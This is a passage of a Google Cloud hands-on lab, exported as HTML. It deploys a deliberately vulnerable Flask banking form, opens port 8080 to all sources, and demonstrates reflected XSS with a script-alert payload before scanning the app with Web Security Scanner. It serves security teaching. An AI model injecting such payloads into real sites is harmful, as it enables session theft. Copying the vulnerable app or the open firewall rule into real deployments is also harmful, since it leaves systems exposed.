hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses create xss-test-ip-address --region=us-central1</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Run the following command to output the static IP address you just generated:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute addresses describe xss-test-ip-address \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--region=us-central1 --format="value(address)"</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 45px;"></div><div class="CodeMirror-gutters" style="display: none; height: 45px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Copy the IP address (a single line of the output) and save it in a notepad.</span></p></li><li><p><span>Run the following command to create a VM instance to run the vulnerable application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute instances create xss-test-vm-instance \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--address=xss-test-ip-address --no-service-account \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--no-scopes --machine-type=e2-micro --zone=us-central1-a \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--metadata=startup-script='apt-get update; apt-get install -y python3-flask'</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>The startup script installs python-flask, a Web Application Framework, which is used for running a simple Python application demonstrating cross-site scripting (XSS) vulnerability, which is a common web application security vulnerability.</span></p><ol start='' ><li><p><span>Run the following command to open a firewall rule for Web Security Scanner to access a vulnerable application. Note the source ranges from which Web Security Scanner scans applications.</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gcloud compute firewall-rules create enable-wss-scan \</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--direction=INGRESS --priority=1000 \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--network=default --action=ALLOW \</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">--rules=tcp:8080 --source-ranges=0.0.0.0/0</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 90px;"></div><div class="CodeMirror-gutters" style="display: none; height: 90px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Create the VM with desired configurations</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-2-deploy-a-vulnerable-application-to-trigger-an-xss-vulnerability-2'><span>Task 2. Deploy a vulnerable application to trigger an XSS vulnerability</span></h2><p><span>In this task, you obtain the application code and introduce a vulnerability for Web Security Scanner to detect. This is in the form of an application, which is a simple form that receives a user&#39;s input and outputs it without any changes.</span></p><ol start='' ><li><p><span>In the Cloud console, on the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), click </span><strong><span>Compute Engine</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>VM Instances</span></strong><span>.</span></p><p><span>This may take a minute to initialize for the first time.</span></p></li><li><p><span>Then click on the </span><strong><span>SSH</span></strong><span> button next to your instance:</span></p></li></ol><p><img src="images\18AiGcc4NgZ78wIbJX3fPQOk4aECAx2liEiwXEEvhiQ%3D" referrerpolicy="no-referrer" alt="SSH button in Cloud console"></p><ol start='' ><li><p><span>A pop-up may appear, asking you to allow SSH in-browser to connect to VMs. Click </span><strong><span>Authorize</span></strong><span>.</span></p></li></ol><p><span>This opens an SSH connection to your VM instance in a new window.</span></p><ol start='' ><li><p><span>In this SSH window (*</span><strong><span>Not in Cloud Shell</span><span>*</span></strong><span>), run the following command to download and extract the vulnerable web application files:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">gsutil cp gs://cloud-training/GCPSEC-ScannerAppEngine/flask_code.tar  . &amp;&amp; tar xvf flask_code.tar</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now run the following command to deploy your application:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Soon after, you should receive a message that indicates your application is up and running.</span></p></li></ol><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Serving Flask app "app" (lazy loading)</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Environment: production</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; WARNING: This is a development server. Do not use it in a production deployment.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> &nbsp; Use a production WSGI server instead.</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Debug mode: off</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;"> * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)</span></pre></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 135px;"></div><div class="CodeMirror-gutters" style="display: none; height: 135px;"></div></div></div></pre><ol start='' ><li><p><span>Find the static IP address of the VM you copied into your notepad earlier.</span></p></li><li><p><span>Replace </span><code>YOUR_EXTERNAL_IP</code><span> in the URL field below with that IP address, and open the URL in a new browser tab:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">http://&lt;YOUR_EXTERNAL_IP&gt;:8080</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><strong><span>Note:</span></strong><span> You can also find the external IP address in the Google Cloud console, where it&#39;s listed as a field associated with your VM instance.</span></p><p><strong><span>Note:</span></strong><span> If you get a pop-up indicating that the external IP doesn&#39;t support a secure connection, click </span><strong><span>Continue to site</span></strong><span>.</span></p><p><span>A Cymbal Bank corporate banking portal with a web form should appear.</span></p><ol start='' ><li><p><span>In the web form, enter the following string:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">&lt;script&gt;alert('This is an XSS Injection')&lt;/script&gt;</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>Now click the </span><strong><span>POST</span></strong><span> button.</span></p></li></ol><p><span>You should receive the following alert window.</span></p><p><img src="images\2JDmvcyzlCfFS71m72VCY%2BEXkNpwbZbxGUnWSWIHnCo%3D" referrerpolicy="no-referrer" alt="Alert window in browser"></p><p><span>This is a common vulnerability in web applications: a cross-site scripting vulnerability. Cross-site scripting (XSS) is a vulnerability that enables attackers to run malicious scripts in users&#39; browsers in the context of your application. Your browser interprets a string as a legitimate Javascript and executes it.</span></p><p><span>An attacker who uses an XSS bug to inject JavaScript into an HTML page gains virtually unlimited access to the logged-in sessions of the victims who visit the page: they may steal user data, tamper with it, change privacy or security settings, or even completely alter the way the product looks and operates. Even more, an XSS vulnerability in one application, no matter how inconsequential, may jeopardize other content within the same domain.</span></p><p><span>This is one of many application vulnerabilities that Web Security Scanner can help you identify.</span></p><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Download vulnerable web application files on the VM</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-3-enable-the-web-security-scanner-api-2'><span>Task 3. Enable the Web Security Scanner API</span></h2><p><span>Now that the vulnerable application is launched, it&#39;s time to demonstrate Web Security Scanner&#39;s abilities to the CTO. But first, you need to configure the API that WSS uses to run.</span></p><ol start='' ><li><p><span>Switch back to the Cloud console browser tab.</span></p></li><li><p><span>From the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), select </span><strong><span>APIs &amp; Services</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>Library</span></strong><span>.</span></p></li><li><p><span>In the Search for APIs and services field, type </span><code>Web Security Scanner</code><span> and press </span><strong><span>Enter</span></strong><span>.</span></p></li><li><p><span>Select the </span><strong><span>Web Security Scanner API</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Enable</span></strong><span> to enable the Web Security Scanner API.</span></p></li></ol><p><span>Click </span><strong><span>Check my progress</span></strong><span> to verify the objective.</span></p><p><span>Enable the Web Security Scanner API</span></p><p>&nbsp;</p><p><span>Check my progress</span></p><p>&nbsp;</p><h2 id='task-4-scan-the-deployed-application-with-wss-2'><span>Task 4. Scan the deployed application with WSS</span></h2><p><span>In this task, you configure and set up a scan of the application to check if it finds security vulnerabilities.</span></p><ol start='' ><li><p><span>Open the </span><strong><span>Navigation menu</span></strong><span> (</span><img src="https://cdn.qwiklabs.com/tkgw1TDgj4Q%2BYKQUW4jUFd0O5OEKlUMBRYbhlCrF0WY%3D" referrerpolicy="no-referrer" alt="Navigation menu icon"><span>), and select </span><strong><span>Security</span></strong><span> </span><strong><span>&gt;</span></strong><span> </span><strong><span>Web Security Scanner</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>+ New Scan</span></strong><span>.</span></p></li><li><p><span>In the </span><strong><span>Starting URLs</span></strong><span> section, the </span><strong><span>Starting URL 1</span></strong><span> field should be pre-populated with your static IP address.</span></p></li><li><p><span>Add the port number </span><strong><span>8080</span></strong><span>, so that the Starting URL resembles the following:</span></p></li></ol><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">  http://&lt;EXTERNAL_IP&gt;:8080</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><ol start='' ><li><p><span>If present, delete </span><strong><span>Starting URL 2</span></strong><span>.</span></p></li><li><p><span>Take a minute to review the remaining fields on the </span><strong><span>Create a new scan</span></strong><span> screen:</span></p></li></ol><ul><li><p><strong><span>Authentication:</span></strong><span> a property that can be used to provide application credentials to allow the scanner to authenticate to an app while scanning.</span></p></li><li><p><strong><span>Schedule:</span></strong><span> a property that can be used to schedule scans to run automatically.</span></p></li><li><p><strong><span>Export to Security Command Center:</span></strong><span> a property that allows you to automatically export scan configurations and scan results to Cloud Security Command Center after scans are finished.</span></p></li></ul><ol start='' ><li><p><span>Verify the </span><strong><span>Authentication</span></strong><span> is still set to </span><strong><span>None</span></strong><span> and that </span><strong><span>Schedule</span></strong><span> is set to </span><strong><span>Never</span></strong><span>.</span></p></li><li><p><span>Click </span><strong><span>Show More</span></strong><span> to investigate the remaining settings.</span></p></li><li><p><span>Click </span><strong><span>Save</span></strong><span> to create the scan.</span></p></li></ol><p><strong><span>Note:</span></strong><span> This creates the scan, but do not run it yet. It must currently be run manually since you did not create a schedule yet.</span></p><ol start='' ><li><p><span>Click </span><strong><span>Run</span></strong><span> to start the scan</span></p></li></ol><p><strong><span>Note:</span></strong><span> Given the number of possible tests, this can take a little over </span><strong><span>10 minutes</span></strong><span> to scan.</span></p><ol start='' ><li><p><span>Return to your SSH session in your separate browser window.</span></p></li></ol><p><span>If the session timed out, run the following command to restart your application:</span></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">python3 app.py</span></pre></div></div></div></div></div></div><div style="position: absolute; height: 0px; width: 1px; border-bottom-width: 0px; border-bottom-style: solid; border-bottom-color: transparent; top: 23px;"></div><div class="CodeMirror-gutters" style="display: none; height: 23px;"></div></div></div></pre><p><span>Copied!</span></p><p><span>In your SSH Window, you should start to see logs generated similar to the example below—this is Web Security Scanner testing all possible URLs for potential vulnerabilities.</span></p><p><strong><span>Output:</span></strong></p><pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" lang=""><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div style="overflow: hidden; position: relative; width: 3px; height: 0px; top: 9.25px; left: 7.734375px;"><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0" style="position: absolute; bottom: -1em; padding: 0px; width: 1000px; height: 1em; outline: currentcolor;"></textarea></div><div class="CodeMirror-scrollbar-filler" cm-not-content="true"></div><div class="CodeMirror-gutter-filler" cm-not-content="true"></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer" style="margin-left: 0px; margin-bottom: 0px; border-right-width: 0px; padding-right: 0px; padding-bottom: 0px;"><div style="position: relative; top: 0px;"><div class="CodeMirror-lines" role="presentation"><div role="presentation" style="position: relative; outline: currentcolor;"><div class="CodeMirror-measure"><pre><span>xxxxxxxxxx</span></pre></div><div class="CodeMirror-measure"></div><div style="position: relative; z-index: 1;"></div><div class="CodeMirror-code" role="presentation" style=""><div class="CodeMirror-activeline" style="position: relative;"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter" style="left: 0px; width: 0px;"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.29.3.21 - - [23/Mar/2023 23:30:41] "GET /output HTTP/1.1" 200 -</span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:06] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:07] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "POST / HTTP/1.1" 302 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /output HTTP/1.1" 200 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">34.68.231.45 - - [23/Mar/2023 23:31:09] "GET /favicon.ico HTTP/1.1" 404 -</span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation" style="padding-right: 0.1px;">35.184.129.44 - - [23/Mar/2023 23:31:17] "POST / HTTP/1.1" 302 -</span></pre><pre class=" 